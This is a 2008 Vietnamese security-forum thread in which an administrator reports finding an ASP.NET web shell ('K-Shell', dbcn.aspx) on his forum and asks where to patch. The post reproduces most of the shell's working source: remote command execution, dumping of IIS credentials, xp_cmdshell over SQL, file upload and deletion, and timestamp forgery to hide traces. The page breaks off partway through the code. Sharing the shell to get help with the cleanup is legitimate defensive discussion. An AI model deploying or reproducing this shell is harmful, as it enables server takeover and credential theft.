<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta name="description" content="HVA discussion board">
<meta name="keywords" content="Forum WWF 9.53 bị nhiễm K-SHELL, làm sao để fix, jforum, jforum java, jforum forum, forum java, java jforum, java forum, forum, rafael steil, bulletin board, java bb, javabb, hva, hvaonline, hvazone, hvaforum">
<meta name="resource-type" content="document">
<meta name="distribution" content="global">
<meta name="robots" content="index,follow">
<meta name="rating" content="general">
<style type="text/css">
<!-- 
@import url( "http://www.hvaonline.net/hvaonline/templates/viet/styles/style.css");
-->
</style>
<style type="text/css">
<!--
@import url("http://www.hvaonline.net/hvaonline/templates/viet/styles/en_US.css");
-->
</style>
<title>Forum WWF 9.53 bị nhiễm K-SHELL, làm sao để fix - .:: HVAOnline ::.</title>

</head>
<body class="en_US">


<!--
Original theme from phpBB (http://www.phpbb.com) subSilver
Created by subBlue design
http://www.subBlue.com
Modifications by JForum Team 
Extended and customised by HVA Team
Added more features and Black Silver theme designed by HVA
-->
<table width="100%" border="0" cols="2">
	<tr align="right">
		<td class="copyright">
			English
			| 
			<a href="/hvaonline/jforum.html?module=forums&amp;action=setLang&amp;lang=vi_VN" rel="nofollow">Vietnamese</a>
		</td>
	</tr>
</table>
<table width="100%" border="0">
	<tr>
		<td>
			<table cellspacing="0" cellpadding="0" width="100%" border="0">
				<tr>			
        <td>&nbsp;
			</td>
		
        <td width="100%" align="center" valign="middle">
						<p><a href="http://www.hvaonline.net" title="[Logo]">
								<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/hvabanner-final.gif" alt="banner" />
							<br>
            				</a><span class="maintitle"></span>
						</p>
          <table cellspacing="0" cellpadding="2" border="0">
							<tr>
								
              <td valign="top" nowrap="nowrap" align="center">
			  						<a href="/hvaonline/forums/rule.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_rule.gif" alt="[Rule]" title="[Rule]"></a>
									<a id="rule" class="topmenu" href="/hvaonline/forums/rule.html">Rules</a>&nbsp;
									
									<a class="topmenu" href="/hvaonline/forums/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_groups.gif" alt="[Home]" title="[Home]"></a>
										<a id="backtosite" class="topmenu" href="/hvaonline/forums/list.html">Main Forum</a>&nbsp;

										<a class="topmenu" href="/hvaonline/portal/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_portal.gif" alt="[Portal]" title="[Portal]"></a>
										<a id="portalsite" class="topmenu" href="/hvaonline/portal/list.html">Portal</a>&nbsp;&nbsp;
									<br>
									
										<a href="/hvaonline/user/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_members.gif" alt="[Members]" title="[Members]"></a>
										<a id="users" class="topmenu" href="/hvaonline/user/list.html">Member Listing</a>&nbsp;
										
										<a href="/hvaonline/forums/stats.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_stats.gif" alt="[Statistics]" title="[Statistics]"></a>
										<a id="stats" class="topmenu" href="/hvaonline/forums/stats.html">Statistics</a>&nbsp;
										
										<a href="/hvaonline/search/filters.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_search.gif" alt="[Search]" title="[Search]"></a>
										<span class="mainmenu"><a id="search" class="topmenu" href="/hvaonline/search/filters.html"><b>Search</b></a>&nbsp;
									
										<a href="/book/"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_book.gif" alt="[Reading Room]" title="[Reading Room]"></a> 
										<a class="topmenu" href="/hvaonline/readingRoom/list.html">Reading Room</a>&nbsp;

									
									<span class="topmenu"> 
										

	
										<br>
											<a id="register" class="topmenu" href="/hvaonline/user/insert.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_register.gif" border="0" alt="[Register]" title="[Register]"> 
												Register</a>&nbsp;&nbsp;</span>
											<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_login.gif" border="0" alt="[Login]" title="[Login]"> 
											<strong>Login</strong> [&nbsp;
											<a id="login" class="topmenu" href="/hvaonline/user/login.html">http</a>&nbsp;
											|
											<a id="logins" class="topmenu" href="https://www.hvaonline.net/hvaonline/user/logins.html">https </a>&nbsp;]</span>
								</td>
							</tr>
							<tr>
								<td>&nbsp;</td>
							</tr>
						</table>
					</td>
				</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td>

<!-- navigator -->
<table cellspacing="2" cellpadding="2" width="100%" border="0" align="center">
	<tr>
		<td valign="baseline" align="left" colspan="0">
			<span class="nav">
			<a class="nav" href="/hvaonline/forums/list.html">Forum Index </a> 
			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif"> <a class="nav" href="/hvaonline/forums/show/8.html">Thảo luận bảo mật </a>
			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif"> <a class="nav" href="/hvaonline/posts/list/26343.html" name="top" id="top">Forum WWF 9.53 bị nhiễm K-SHELL, làm sao để fix</a>
				&nbsp;<a href="/hvaonline/rss/topicPosts/26343.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/xml_button.gif" border="0" alt="XML"></a>
			</span>
		
		</td>

		<td valign="middle" align="right" class="nav"></td>
	</tr>
</table>

<!-- poll show -->

  <!-- POST LISTING -->


<table cellspacing="0" cellpadding="0" width="100%" align="center" border="1">
	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr>

		

		<th nowrap="nowrap" class="thright" height="20" valign="middle" align="left">&nbsp;&nbsp;<span class="posttype"><font color="#777777">[Question]</font></span>&nbsp;&nbsp; Forum WWF 9.53 bị nhiễm K-SHELL, làm sao để fix<a name="160026" id="160026"></a></th>
        <th class="thleft" nowrap="nowrap" width="300" height="20" valign="middle" align="right">24/11/2008 12:17:20 (+0700) | <a href="/hvaonline/posts/list/26343.html#160026">#1</a> | 160026 </th>
		
      </tr>
	</table>

	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr> 
		<!-- Username & profile -->
          	<td class="rowButton" valign="top">
<table cellspacing="3" cellpadding="3" width="100%" align="left" border="0">
<tr>

<td align="left">
<span class="uprofile"><a href="/hvaonline/user/profile/133751.html"><b>ktstbniit</b></a><br>
	<font color="#CCCCCC">Member</font></span>
<br>

<span class="uprofile">
		
</span>
	<table cellspacing="0" cellpadding="0" border="0" width="20" height="8">
		<tr>
			<td>
				<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/minus.gif" alt="[Minus]" title="[Minus]"></a>	</td>
			<td height="4" width="16">
				<span class="warn">&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;</span>	</td>
			<td>
				<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/plus.gif" alt="[Plus]" title="[Plus]"></a>
			</td>
		</tr>
	</table>

<!-- --></td>
	<td align="left" class="gen" width="180">
		Joined: 03/01/2007 10:39:15<br>
		Messages: 5<br>
	
	
	
			<span class="offline">Offline </span>
	<br>
<table cellspacing="0" cellpadding="0" border="0" width="100%">
  <tr>
	<td valign="middle" nowrap="nowrap"> 
		<a href="/hvaonline/user/profile/133751.html" class="icon_profile"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_profile.gif" alt="[Profile]" title="[Profile]"></a>
		<a href="/hvaonline/pm/sendTo/133751.html" class="icon_pm"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_pm.gif" alt="[PM]" title="[PM]"></a>

		
			<a href="http://e-sach.com" target="_new"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_www.gif" alt="[WWW]" title="[www]"></a>
		
			<a href="http://edit.yahoo.com/config/send_webmesg?.target=ktstbniit&amp;.src=pg"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_yim.gif" alt="[Yahoo!]" title="[YIM]"></a>
		
		
	</td>
</tr>
  <tr>
    <td valign="middle" nowrap="nowrap">
	
</td>
  </tr>
</table>
	</td>
</tr>
</table>
</td>
      </tr>
	</table>
	
	<table cellspacing="1" cellpadding="3" width="100%" align="center" border="0">
      <tr>
        <!-- Message -->
        <td colspan="2" valign="top" class="row1">
				<!-- should view editeBy or not -->
			  <!-- which to view -->
                <table cellspacing="3" cellpadding="3" width="100%" align="center" border="0">
                  <tr>
                    <td valign="top" class="row1"><span class="postbody">Hôm nay vào forum, tôi thấy có 1 file có tên là dbcn.aspx, mở ra tôi đoán chính xác là 1 con shell. Chạy lên nó hiện như sau: K - Shell ....kikicoco<br/> <br/> Tôi đã dò tất cả các phần mà ủe có thể upload. Tuy nhiên, tôi muốn member nào đã có kinh nghiệm về vụ này chia sẻ cho tôi những chỗ nào cần fix trong forum.<br/> <br/> Dưới đây là mã nguồn của nó:<br/> <br/> <span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>&lt;%@ Page Language="VB" ContentType="text/html"  validateRequest="false" aspcompat="true"%&gt;
&lt;%@ Import Namespace="System.IO" %&gt;
&lt;%@ import namespace="System.Diagnostics" %&gt;
&lt;%@ import namespace="System.Threading" %&gt;
&lt;%@ import namespace="System.Text" %&gt;
&lt;%@ import namespace="System.Security.Cryptography" %&gt;
&lt;script runat="server"&gt;
Dim PASSWORD as string = "26d49f07ceebca39e994ca12a3b52f2d"   'Hash MD5 of password
dim url,TEMP1,TEMP2,TITLE as string
Function GetMD5&#40;ByVal strPlain As String&#41; As String
 	Dim UE As UnicodeEncoding = New UnicodeEncoding
 	Dim HashValue As Byte&#40;&#41;
 	Dim MessageBytes As Byte&#40;&#41; = UE.GetBytes&#40;strPlain&#41;
 	Dim md5 As MD5 = New MD5CryptoServiceProvider
 	Dim strHex As String = ""
 	HashValue = md5.ComputeHash&#40;MessageBytes&#41;
	 For Each b As Byte In HashValue
   	strHex += String.Format&#40;"{0<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">2}", b&#41;
 	Next
 	Return strHex
End Function
Sub Login_click&#40;sender As Object, E As EventArgs&#41;
	if GetMD5&#40;Textbox.Text&#41;=PASSWORD then     
		session&#40;"kikicoco"&#41;=1
		session.Timeout=45
	else
		response.Write&#40;"&lt;font color='red'&gt;Your password is wrong! Maybe you press the ""Caps Lock"" buttom. Try again.&lt;/font&gt;&lt;br&gt;"&#41;
	end if
End Sub
'Run w32 shell
Declare Function WinExec Lib "kernel32" Alias "WinExec" &#40;ByVal lpCmdLine As String, ByVal nCmdShow As Long&#41; As Long
Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" &#40;ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long&#41;  As Long

Sub RunCmdW32&#40;Src As Object, E As EventArgs&#41;
	dim command
	dim fileObject = Server.CreateObject&#40;"Scripting.FileSystemObject"&#41;		
	dim tempFile = Environment.GetEnvironmentVariable&#40;"TEMP"&#41; & "\"& fileObject.GetTempName&#40; &#41;
	If Request.Form&#40;"txtCommand1"&#41; = "" Then
		command = "dir c:\"	
	else 
		command = Request.Form&#40;"txtCommand1"&#41;
	End If	
	ExecuteCommand1&#40;command,tempFile&#41;
	OutputTempFile1&#40;tempFile,fileObject&#41;
	'txtCommand1.text=""
End Sub
function ExecuteCommand1&#40;command, tempFile&#41;
	Dim winObj, objProcessInfo, item, local_dir, local_copy_of_cmd, Target_copy_of_cmd
	Dim objStartup, objConfig, objProcess, errReturn, intProcessID, temp_name
	Dim FailIfExists
	
	local_dir = left&#40;request.servervariables&#40;"PATH_TRANSLATED"&#41;,inStrRev&#40;request.servervariables&#40;"PATH_TRANSLATED"&#41;,"\"&#41;&#41;
	local_copy_of_cmd = Local_dir+"cmd.exe"
	Target_copy_of_cmd = Environment.GetEnvironmentVariable&#40;"Temp"&#41;+"\smssa.exe"
	CopyFile&#40;local_copy_of_cmd, Target_copy_of_cmd,FailIfExists&#41;
	errReturn = WinExec&#40;Target_copy_of_cmd + " /c " + command + "  &gt; " + tempFile , 10&#41;
	response.write&#40;errReturn&#41;
	thread.sleep&#40;500&#41;
	end function
Sub OutputTempFile1&#40;tempFile,oFileSys&#41;
	On Error Resume Next 
	dim oFile = oFileSys.OpenTextFile &#40;tempFile, 1, False, 0&#41;
	resultcmdw32.text=txtCommand1.text & vbcrlf & "&lt;pre&gt;" & &#40;Server.HTMLEncode&#40;oFile.ReadAll&#41;&#41; & "&lt;/pre&gt;"
   	oFile.Close
   	Call oFileSys.DeleteFile&#40;tempFile, True&#41;	 
End sub
'End w32 shell
'Run WSH shell
Sub RunCmdWSH&#40;Src As Object, E As EventArgs&#41;
	dim command
	dim fileObject = Server.CreateObject&#40;"Scripting.FileSystemObject"&#41;
	dim oScriptNet = Server.CreateObject&#40;"WSCRIPT.NETWORK"&#41;
	dim tempFile = Environment.GetEnvironmentVariable&#40;"TEMP"&#41; & "\"& fileObject.GetTempName&#40; &#41;
	If Request.Form&#40;"txtcommand2"&#41; = "" Then
		command = "dir c:\"	
	else 
		command = Request.Form&#40;"txtcommand2"&#41;
	End If	  
	ExecuteCommand2&#40;command,tempFile&#41;
	OutputTempFile2&#40;tempFile,fileObject&#41;
	txtCommand2.text=""
End Sub
Function ExecuteCommand2&#40;cmd_to_execute, tempFile&#41;
	  Dim oScript
	  oScript = Server.CreateObject&#40;"WSCRIPT.SHELL"&#41;
      Call oScript.Run &#40;"cmd.exe /c " & cmd_to_execute & " &gt; " & tempFile, 0, True&#41;
End function
Sub OutputTempFile2&#40;tempFile,fileObject&#41;
    On Error Resume Next
	dim oFile = fileObject.OpenTextFile &#40;tempFile, 1, False, 0&#41;
	resultcmdwsh.text=txtCommand2.text & vbcrlf & "&lt;pre&gt;" & &#40;Server.HTMLEncode&#40;oFile.ReadAll&#41;&#41; & "&lt;/pre&gt;"
	oFile.Close
	Call fileObject.DeleteFile&#40;tempFile, True&#41;
End sub
'End WSH shell

'System infor
Sub output_all_environment_variables&#40;mode&#41;
   	Dim environmentVariables As IDictionary = Environment.GetEnvironmentVariables&#40;&#41;
   	Dim de As DictionaryEntry
	For Each de In  environmentVariables
	if mode="HTML" then
	response.write&#40;"&lt;b&gt; " +de.Key + " &lt;/b&gt;: " + de.Value + "&lt;br&gt;"&#41;
	else
	if mode="text"
	response.write&#40;de.Key + ": " + de.Value + vbnewline+ vbnewline&#41;
	end if		
	end if
   	Next
End sub
Sub output_all_Server_variables&#40;mode&#41;
    dim item
    for each item in request.servervariables
	if mode="HTML" then
	response.write&#40;"&lt;b&gt;" + item + "&lt;/b&gt; : "&#41;
	response.write&#40;request.servervariables&#40;item&#41;&#41;
	response.write&#40;"&lt;br&gt;"&#41;
	else
		if mode="text"
			response.write&#40;item + " : " + request.servervariables&#40;item&#41; + vbnewline + vbnewline&#41;
		end if		
	end if
           next
End sub
'End sysinfor

'Begin List processes
Function output_wmi_function_data&#40;Wmi_Function,Fields_to_Show&#41;
		dim objProcessInfo , winObj, item , Process_properties, Process_user, Process_domain
		dim fields_split, fields_item,i

		'on error resume next

		table&#40;"0","",""&#41;
		Create_table_row_with_supplied_colors&#40;"black","white","center",Fields_to_Show&#41;

		winObj = GetObject&#40;"winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2"&#41;
		objProcessInfo = winObj.ExecQuery&#40;"Select "+Fields_to_Show+" from " + Wmi_Function&#41;					
		
		fields_split = split&#40;Fields_to_Show,","&#41;
		for each item in objProcessInfo	
			tr
				Surround_by_TD_and_Bold&#40;item.properties_.item&#40;fields_split&#40;0&#41;&#41;.value&#41;
				if Ubound&#40;Fields_split&#41;&gt;0 then
					for i = 1 to ubound&#40;fields_split&#41;
						Surround_by_TD&#40;center_&#40;item.properties_.item&#40;fields_split&#40;i&#41;&#41;.value&#41;&#41;				
					next
				end if
			_tr
		next
End function
Function output_wmi_function_data_instances&#40;Wmi_Function,Fields_to_Show,MaxCount&#41;
		dim objProcessInfo , winObj, item , Process_properties, Process_user, Process_domain
		dim fields_split, fields_item,i,count
		newline
		rw&#40;"Showing the first " + cstr&#40;MaxCount&#41; + " Entries"&#41;
		newline
		newline
		table&#40;"1","",""&#41;
		Create_table_row_with_supplied_colors&#40;"black","white","center",Fields_to_Show&#41;
		_table
		winObj = GetObject&#40;"winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2"&#41;
'		objProcessInfo = winObj.ExecQuery&#40;"Select "+Fields_to_Show+" from " + Wmi_Function&#41;					
		objProcessInfo = winObj.InstancesOf&#40;Wmi_Function&#41;					
		
		fields_split = split&#40;Fields_to_Show,","&#41;
		count = 0
		for each item in objProcessInfo		
			count = Count + 1
			table&#40;"1","",""&#41;
			tr
				Surround_by_TD_and_Bold&#40;item.properties_.item&#40;fields_split&#40;0&#41;&#41;.value&#41;
				if Ubound&#40;Fields_split&#41;&gt;0 then
					for i = 1 to ubound&#40;fields_split&#41;
						Surround_by_TD&#40;item.properties_.item&#40;fields_split&#40;i&#41;&#41;.value&#41;				
					next
				end if
			_tr
			if count &gt; MaxCount then exit for
		next
End function
'End List processes
'Begin IIS_list_Anon_Name_Pass
Sub IIS_list_Anon_Name_Pass&#40;&#41;
		Dim IIsComputerObj, iFlags ,providerObj ,nodeObj ,item, IP
		
		IIsComputerObj = CreateObject&#40;"WbemScripting.SWbemLocator"&#41; 			' Create an instance of the IIsComputer object
		providerObj = IIsComputerObj.ConnectServer&#40;"127.0.0.1", "root/microsoftIISv2"&#41;
		nodeObj  = providerObj.InstancesOf&#40;"IIsWebVirtualDirSetting"&#41; '  - IISwebServerSetting
		
		Dim MaxCount = 20,Count = 0
		hr
		RW&#40;"only showing the first "+cstr&#40;MaxCount&#41; + " items"&#41;
		hr
		for each item in nodeObj
			response.write&#40;"&lt;b&gt;" + item.AppFriendlyName + " &lt;/b&gt; -  "&#41;
			response.write&#40;"&#40;" + item.AppPoolId + "&#41; "&#41;
		
			response.write&#40;item.AnonymousUserName + " : "&#41;
			response.write&#40;item.AnonymousUserPass&#41;
			
			response.write&#40;"&lt;br&gt;"&#41;
			
			response.flush
			Count = Count +1
			If Count &gt; MaxCount then exit for
		next		
		hr
End sub	
'End IIS_list_Anon_Name_Pass
Sub RunCMD&#40;Src As Object, E As EventArgs&#41;
	Try
	Dim kProcess As New Process&#40;&#41;
	Dim kProcessStartInfo As New ProcessStartInfo&#40;"cmd.exe"&#41;
	kProcessStartInfo.UseShellExecute = False
	kProcessStartInfo.RedirectStandardOutput = true
	kProcess.StartInfo = kProcessStartInfo
	kProcessStartInfo.Arguments="/c " & Cmd.text
	kProcess.Start&#40;&#41;
	Dim myStreamReader As StreamReader = kProcess.StandardOutput
	Dim myString As String = myStreamReader.Readtoend&#40;&#41;
	kProcess.Close&#40;&#41;
	result.text=Cmd.text & vbcrlf & "&lt;pre&gt;" & mystring & "&lt;/pre&gt;"
	Cmd.text=""
	Catch
	result.text="This function has disabled!"
	End Try
End Sub
Sub CloneTime&#40;Src As Object, E As EventArgs&#41;
	existdir&#40;time1.Text&#41;
	existdir&#40;time2.Text&#41;
	Dim thisfile As FileInfo =New FileInfo&#40;time1.Text&#41;
	Dim thatfile As FileInfo =New FileInfo&#40;time2.Text&#41;
	thisfile.LastWriteTime = thatfile.LastWriteTime
	thisfile.LastAccessTime = thatfile.LastAccessTime
	thisfile.CreationTime = thatfile.CreationTime
	response.Write&#40;"&lt;font color=""red""&gt;Clone Time Success!&lt;/font&gt;"&#41;
End Sub
sub Editor&#40;Src As Object, E As EventArgs&#41;
	dim mywrite as new streamwriter&#40;filepath.text,false,encoding.default&#41;
	mywrite.write&#40;content.text&#41;
	mywrite.close
	response.Write&#40;"&lt;script&gt;alert&#40;'Edit|Creat " & replace&#40;filepath.text,"\","\\"&#41; & " Success!'&#41;;location.href='"& request.ServerVariables&#40;"URL"&#41; & "?action=goto&src="& server.UrlEncode&#40;Getparentdir&#40;filepath.text&#41;&#41; &"'&lt;/sc" & "ript&gt;"&#41;
end sub
Sub UpLoad&#40;Src As Object, E As EventArgs&#41;
	dim filename,loadpath as string
	filename=path.getfilename&#40;UpFile.value&#41;
	loadpath=request.QueryString&#40;"src"&#41; & filename
	if  file.exists&#40;loadpath&#41;=true then 
		response.Write&#40;"&lt;script&gt;alert&#40;'File " & replace&#40;loadpath,"\","\\"&#41; & " have existed , upload fail!'&#41;;location.href='"& request.ServerVariables&#40;"URL"&#41; & "?action=goto&src="& server.UrlEncode&#40;request.QueryString&#40;"src"&#41;&#41; &"'&lt;/sc" & "ript&gt;"&#41;
		response.End&#40;&#41;
	end if
	UpFile.postedfile.saveas&#40;loadpath&#41;
	response.Write&#40;"&lt;script&gt;alert&#40;'File " & filename & " upload success!\nFile info:\n\nClient Path:" & replace&#40;UpFile.value,"\","\\"&#41; & "\nFile Size:" & UpFile.postedfile.contentlength & " bytes\nSave Path:" & replace&#40;loadpath,"\","\\"&#41; & "\n'&#41;;"&#41;
	response.Write&#40;"location.href='" & request.ServerVariables&#40;"URL"&#41; & "?action=goto&src=" & server.UrlEncode&#40;request.QueryString&#40;"src"&#41;&#41; & "'&lt;/sc" & "ript&gt;"&#41;
End Sub
Sub NewFD&#40;Src As Object, E As EventArgs&#41;
	url=request.form&#40;"src"&#41;
	if NewFile.Checked = True then
		dim mywrite as new streamwriter&#40;url & NewName.Text,false,encoding.default&#41;
		mywrite.close
		response.Redirect&#40;request.ServerVariables&#40;"URL"&#41; & "?action=edit&src=" & server.UrlEncode&#40;url & NewName.Text&#41;&#41;
	else
		directory.createdirectory&#40;url & NewName.Text&#41;
		response.Write&#40;"&lt;script&gt;alert&#40;'Creat directory " & replace&#40;url & NewName.Text ,"\","\\"&#41; & " Success!'&#41;;location.href='"& request.ServerVariables&#40;"URL"&#41; & "?action=goto&src="& server.UrlEncode&#40;url&#41; &"'&lt;/sc" & "ript&gt;"&#41;
	end if
End Sub
Sub del&#40;a&#41;
	if right&#40;a,1&#41;="\" then
		dim xdir as directoryinfo
		dim mydir as new DirectoryInfo&#40;a&#41;
		dim xfile as fileinfo
		for each xfile in mydir.getfiles&#40;&#41;
			file.delete&#40;a & xfile.name&#41;
		next
		for each xdir in mydir.getdirectories&#40;&#41;
			call del&#40;a & xdir.name & "\"&#41;
		next
		directory.delete&#40;a&#41;
	else
		file.delete&#40;a&#41;
	end if
End Sub
Sub copydir&#40;a,b&#41;
	dim xdir as directoryinfo
	dim mydir as new DirectoryInfo&#40;a&#41;
	dim xfile as fileinfo
	for each xfile in mydir.getfiles&#40;&#41;
		file.copy&#40;a & "\" & xfile.name,b & xfile.name&#41;
	next
	for each xdir in mydir.getdirectories&#40;&#41;
		directory.createdirectory&#40;b & path.getfilename&#40;a & xdir.name&#41;&#41;
		call copydir&#40;a & xdir.name & "\",b & xdir.name & "\"&#41;
	next
End Sub
Sub xexistdir&#40;temp,ow&#41;
	if directory.exists&#40;temp&#41;=true or file.exists&#40;temp&#41;=true then 
		if ow=0  then
			response.Redirect&#40;request.ServerVariables&#40;"URL"&#41; & "?action=samename&src=" & server.UrlEncode&#40;url&#41;&#41;
		elseif ow=1 then
			del&#40;temp&#41;
		else
			dim d as string = session&#40;"cutboard"&#41;
			if right&#40;d,1&#41;="\" then
				TEMP1=url & second&#40;now&#41; & path.getfilename&#40;mid&#40;replace&#40;d,"",""&#41;,1,len&#40;replace&#40;d,"",""&#41;&#41;-1&#41;&#41;
			else
				TEMP2=url & second&#40;now&#41; & replace&#40;path.getfilename&#40;d&#41;,"",""&#41;
			end if
		end if
	end if
End Sub
Sub existdir&#40;temp&#41;
		if  file.exists&#40;temp&#41;=false and directory.exists&#40;temp&#41;=false then 
			response.Write&#40;"&lt;script&gt;alert&#40;'Don\'t exist " & replace&#40;temp,"\","\\"&#41;  &" ! Is it a CD-ROM ?'&#41;;&lt;/sc" & "ript&gt;"&#41;
			response.Write&#40;"&lt;br&gt;&lt;br&gt;&lt;a href='javascript:history.back&#40;1&#41;;'&gt;Click Here Back&lt;/a&gt;"&#41;
			response.End&#40;&#41;
		end if
End Sub
Sub RunSQLCMD&#40;Src As Object, E As EventArgs&#41;
	Dim adoConn,strQuery,recResult,strResult
	if SqlName.Text&lt;&gt;"" then
		adoConn=Server.CreateObject&#40;"ADODB.Connection"&#41; 
		adoConn.Open&#40;"Provider=SQLOLEDB.1;Password=" & SqlPass.Text & ";UID=" & SqlName.Text & ";Data Source = " & ip.Text&#41; 
		If Sqlcmd.Text&lt;&gt;"" Then 
			strQuery = "exec master.dbo.xp_cmdshell '" & Sqlcmd.Text & "'" 
	  		recResult = adoConn.Execute&#40;strQuery&#41; 
 	 		If NOT recResult.EOF Then 
   				Do While NOT recResult.EOF 
    				strResult = strResult & chr&#40;13&#41; & recResult&#40;0&#41;.value
    				recResult.MoveNext 
   				Loop 
 	 		End if 
  			recResult = Nothing 
  			strResult = Replace&#40;strResult," ","&nbsp;"&#41; 
  			strResult = Replace&#40;strResult,"&lt;","&lt;"&#41; 
  			strResult = Replace&#40;strResult,"&gt;","&gt;"&#41; 
			resultSQL.Text=SqlCMD.Text & vbcrlf & "&lt;pre&gt;" & strResult & "&lt;/pre&gt;"
			SqlCMD.Text=""
		 End if 
  		adoConn.Close 
	 End if
 End Sub
Function GetStartedTime&#40;ms&#41; 
	GetStartedTime=cint&#40;ms/&#40;1000*60*60&#41;&#41;
End function
Function getIP&#40;&#41; 
    Dim strIPAddr as string
    If Request.ServerVariables&#40;"HTTP_X_FORWARDED_FOR"&#41; = "" OR InStr&#40;Request.ServerVariables&#40;"HTTP_X_FORWARDED_FOR"&#41;, "unknown"&#41; &gt; 0 Then
        strIPAddr = Request.ServerVariables&#40;"REMOTE_ADDR"&#41;
    ElseIf InStr&#40;Request.ServerVariables&#40;"HTTP_X_FORWARDED_FOR"&#41;, ","&#41; &gt; 0 Then
        strIPAddr = Mid&#40;Request.ServerVariables&#40;"HTTP_X_FORWARDED_FOR"&#41;, 1, InStr&#40;Request.ServerVariables&#40;"HTTP_X_FORWARDED_FOR"&#41;, ","&#41;-1&#41;
    ElseIf InStr&#40;Request.ServerVariables&#40;"HTTP_X_FORWARDED_FOR"&#41;, ";"&#41; &gt; 0 Then
        strIPAddr = Mid&#40;Request.ServerVariables&#40;"HTTP_X_FORWARDED_FOR"&#41;, 1, InStr&#40;Request.ServerVariables&#40;"HTTP_X_FORWARDED_FOR"&#41;, ";"&#41;-1&#41;
    Else
        strIPAddr = Request.ServerVariables&#40;"HTTP_X_FORWARDED_FOR"&#41;
    End If
    getIP = Trim&#40;Mid&#40;strIPAddr, 1, 30&#41;&#41;
End Function
Function Getparentdir&#40;nowdir&#41;
	dim temp,k as integer
	temp=1
	k=0
	if len&#40;nowdir&#41;&gt;4 then 
		nowdir=left&#40;nowdir,len&#40;nowdir&#41;-1&#41; 
	end if
	do while temp&lt;&gt;0
		k=temp+1
		temp=instr&#40;temp,nowdir,"\"&#41;
		if temp =0 then
			exit do
		end if
		temp = temp+1
	loop
	if k&lt;&gt;2 then
		getparentdir=mid&#40;nowdir,1,k-2&#41;
	else
		getparentdir=nowdir
	end if
End function
Function Rename&#40;&#41;
	url=request.QueryString&#40;"src"&#41;
	if file.exists&#40;Getparentdir&#40;url&#41; & request.Form&#40;"name"&#41;&#41; then
		rename=0   
	else
		file.copy&#40;url,Getparentdir&#40;url&#41; & request.Form&#40;"name"&#41;&#41;
		del&#40;url&#41;
		rename=1
	end if
End Function 
Function GetSize&#40;temp&#41;
	if temp &lt; 1024 then
		GetSize=temp & " bytes"
	else
		if temp\1024 &lt; 1024 then
			GetSize=temp\1024 & " KB"
		else
			if temp\1024\1024 &lt; 1024 then
				GetSize=temp\1024\1024 & " MB"
			else
				GetSize=temp\1024\1024\1024 & " GB"
			end if
		end if
	end if
End Function 
	Sub downTheFile&#40;thePath&#41;
		dim stream
		stream=server.createObject&#40;"adodb.stream"&#41;
		stream.open
		stream.type=1
		stream.loadFromFile&#40;thePath&#41;
		response.addHeader&#40;"Content-Disposition", "attachment; filename=" & replace&#40;server.UrlEncode&#40;path.getfilename&#40;thePath&#41;&#41;,"+"," "&#41;&#41;
		response.addHeader&#40;"Content-Length",stream.Size&#41;
		response.charset="UTF-8"
		response.contentType="application/octet-stream"
		response.binaryWrite&#40;stream.read&#41;
		response.flush
		stream.close
		stream=nothing
		response.End&#40;&#41;
End Sub
'H T M L  S N I P P E T S
public sub Newline
		response.write&#40;"&lt;BR&gt;"&#41;
	end sub
	
	public sub TextNewline
		response.write&#40;vbnewline&#41;
	end sub

	public sub rw&#40;text_to_print&#41;	  ' Response.write
		response.write&#40;text_to_print&#41;
	end sub

	public sub rw_b&#40;text_to_print&#41;
		rw&#40;"&lt;b&gt;"+text_to_print+"&lt;/b&gt;"&#41;
	end sub

	public sub hr&#40;&#41;
		rw&#40;"&lt;hr&gt;"&#41;
	end sub

	public sub ul&#40;&#41;
		rw&#40;"&lt;ul&gt;"&#41;
	end sub

	public sub _ul&#40;&#41;
		rw&#40;"&lt;/ul&gt;"&#41;
	end sub

	public sub table&#40;border_size,width,height&#41;
		rw&#40;"&lt;table border='"+cstr&#40;border_size&#41;+"' width ='"+cstr&#40;width&#41;+"' height='"+cstr&#40;height&#41;+"'&gt;"&#41;
	end sub

	public sub _table&#40;&#41;
		rw&#40;"&lt;/table&gt;"&#41;
	end sub

	public sub tr&#40;&#41;
		rw&#40;"&lt;tr&gt;"&#41;
	end sub

	public sub _tr&#40;&#41;
		rw&#40;"&lt;/tr&gt;"&#41;
	end sub

	public sub td&#40;&#41;
		rw&#40;"&lt;td&gt;"&#41;
	end sub

